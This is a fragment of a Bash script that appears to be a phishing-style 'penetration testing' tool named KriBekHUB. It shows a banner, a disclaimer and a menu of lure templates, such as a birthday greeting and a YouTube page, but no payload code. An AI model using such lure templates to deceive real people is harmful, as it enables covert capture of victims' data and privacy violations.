...
▄█████████▀  █▀   ▄█████████▀    ██████████   ███   ▀█▀  _  ______  ___ ____  _____ _  ___   _ _   _ ____  
      ...
      Powered by KriBekHUB                              | . \|  _ < | || |_) | |___| . \|  _  | |_| | |_) | Bibek
      Purpose: Penetration Testing ||                   |_|\_\_| \_\___|____/|_____|_|\_\_| |_|\___/|____/  
\e[0m"

  printf "\n\e[1;93m ▸ KriBekHUB v2.0\e[0m\n"
  printf "\e[1;77m ▸ GitHub: https://github.com/Bibekbista0406\e[0m\n"
  printf "\e[1;91m ▸ Created by Bibek Bista for ethical hacking and educational use only.\e[0m\n"
...
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Birthday Wishing\e[0m\n"
...
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Birthday Person name  Not Needed: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID Not Needed: \e[0m' yt_video_ID
